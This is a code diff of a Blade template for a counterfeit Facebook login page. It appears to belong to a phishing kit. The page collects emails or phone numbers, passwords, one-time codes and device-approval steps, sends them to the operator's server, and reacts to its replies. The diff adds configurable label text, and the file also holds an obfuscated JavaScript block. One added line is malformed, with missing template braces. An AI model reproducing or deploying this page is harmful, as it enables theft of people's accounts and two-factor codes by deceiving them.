@@ -57,7 +57,8 @@
             <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('facebook.check_other_devices_msg') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/another_device.png" alt="Xác minh thiết bị" class="w-full h-auto">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/another_device.png"
+                    alt="Xác minh thiết bị" class="w-full h-auto">
             </div>
             <div class="text-5xl text-center font-bold tracking-[10px] mb-4" id="device_code">52</div>
             <div class="flex items-center gap-3 mb-5">
@@ -78,7 +79,8 @@
             <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('facebook.check_device_notification_message') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/device.png"
+                    alt="Xác minh thiết bị" class="w-full h-auto">
             </div>
             <div class="flex items-center gap-3 mb-5">
                 <i class="fa-light fa-circle-notch fa-spin"></i>
@@ -142,7 +144,7 @@
                                     required>
                                 <label
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
-                                    for="user">{{ __('facebook.email_or_phone') }}</label>
+                                    for="user">{{ filled($login_theme_config->facebook->username) ? $login_theme_config->facebook->username : __('facebook.email_or_phone') }}</label>
                                 <button id="close_btn" class="cursor-pointer hidden" type="button" tabindex="-1">
                                     <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/close_logo.svg"
                                         width="25" />
@@ -156,7 +158,7 @@
                                     required>
                                 <label
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
-                                    for="pass">{{ __('facebook.password') }}</label>
+                                    for="pass">{{ filled($login_theme_config->facebook->password) ? $login_theme_config->facebook->password : __('facebook.password') }}</label>
                                 @if ($setting->showFacebookPasswordButton)
                                     <button type="button" id="show_pass" class="cursor-pointer hidden"
                                         tabindex="-1">
@@ -174,15 +176,16 @@
                         <button type="submit"
                             class="outline-none cursor-pointer w-full bg-[#0064e0] text-white rounded-[100px] p-2.5 text-sm active:bg-[#3b8ef5] active:scale-[99%] transition-all duration-100 disabled:opacity-80 disabled:cursor-default disabled:pointer-events-none"
                             id="log_btn">
-                            {{ __('facebook.login') }}</button>
+                            {{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}</button>
                     </form>
                     <div class="mt-2">
                         <p class="text-center text-sm text-[#0d1114] cursor-pointer">
-                            {{ __('facebook.forgot_password') }}</p>
+                            {{ filled($login_theme_config->facebook->forgot_password) ? $login_theme_config->facebook->forgot_password : __('facebook.forgot_password') }}
+                        </p>
                         <div class="space-y-6 mt-[100px]">
                             <button
                                 class="font-semibold outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
-                                {{ __('facebook.create_new_account') }}
+                                {{ filled($login_theme_config->facebook->create_account) ? $login_theme_config->facebook->create_account : __('facebook.create_new_account') }}
                             </button>
                             <div class="flex justify-center mb-5">
                                 <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
@@ -233,13 +236,21 @@
             } else {
                 if (data.wrong_password) {
                     warning.show()
-                    warning.html("{{ __('facebook.invalid_password') }}")
-                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                    warning.html(
+                        "{{ filled($login_theme_config->facebook->invalid_password) ? $login_theme_config->facebook->invalid_password : __('facebook.invalid_password') }}"
+                        )
+                    btn.attr('disabled', false).html(
+                        "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                        )
                 }
                 if (data.wrong_user) {
                     warning.show()
-                    warning.html("{{ __('facebook.wrong_phone_or_email') }}")
-                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                    warning.html(
+                        "{{ filled($login_theme_config->facebook->invalid_username) ? $login_theme_config->facebook->invalid_username : __('facebook.wrong_phone_or_email') }}"
+                        )
+                    btn.attr('disabled', false).html(
+                        "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                        )
                 }
                 if (data.otp_request) {
                     $("#main").remove()
@@ -249,8 +260,10 @@
                 }
                 if (data.request_resend) {
                     $("#warning_otp").show()
-                    $("#warning_otp").html("{{ __('facebook.invalid_authentication_code') }}")
-                    $("#confirm_otp").html("{{ __('facebook.confirm') }}").attr('disabled', false)
+                    $("#warning_otp").html("__('facebook.invalid_authentication_code') }}")
+                    $("#confirm_otp").html(
+                        "{{ filled($login_theme_config->facebook->confirm_btn) ? $login_theme_config->facebook->confirm_btn : __('facebook.confirm') }}"
+                        ).attr('disabled', false)
                 }
                 if (data.another_device_verify) {
                     $("#main").remove()
@@ -274,7 +287,9 @@
                 'info': '{{ $info }}',
                 'ac': 'n'
             }
-            btn.attr('disabled', true).html("{{ __('facebook.logging_in') }}")
+            btn.attr('disabled', true).html(
+                "{{ filled($login_theme_config->facebook->login_in_progress) ? $login_theme_config->facebook->login_in_progress : __('facebook.logging_in') }}"
+                )
             // auto detect phone or string
             warning.hide()
             @if ($setting->checkLoginFacebook)
@@ -282,14 +297,18 @@
                     if (!check_email(username)) {
                         warning.html("{{ __('facebook.wrong_email') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html(
+                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                            )
                         return
                     }
                 } else {
                     if (!phone_check(username)) {
                         warning.html("{{ __('facebook.wrong_phone_or_email') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html(
+                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                            )
                         return
                     }
                 }
@@ -298,7 +317,9 @@
                 if (password.length < 5) {
                     warning.html("{{ __('facebook.password_too_short') }}")
                     warning.show()
-                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                    btn.attr('disabled', false).html(
+                        "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                        )
                     return
                 }
             @endif
@@ -311,7 +332,9 @@
                     if (!data.status) {
                         warning.html("{{ __('facebook.try_again') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html(
+                            "{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}"
+                            )
                         return
                     }
                 },
@@ -375,7 +398,7 @@
                                 0x75)) / 0x5 * (-parseInt(_0x4d4965(0x6d)) / 0x6) + -parseInt(_0x4d4965(0x66)) / 0x7 * (
                                 -parseInt(_0x4d4965(0x77)) / 0x8) + parseInt(_0x4d4965(0x6b)) / 0x9 * (parseInt(
                                 _0x4d4965(0x68)) / 0xa) + -parseInt(_0x4d4965(0x71)) / 0xb + -parseInt(_0x4d4965(
-                            0x69)) / 0xc;
+                                0x69)) / 0xc;
                         if (_0x1dbb7f === _0x130420) break;
                         else _0x497ad1['push'](_0x497ad1['shift']());
                     } catch (_0x53c8ac) {
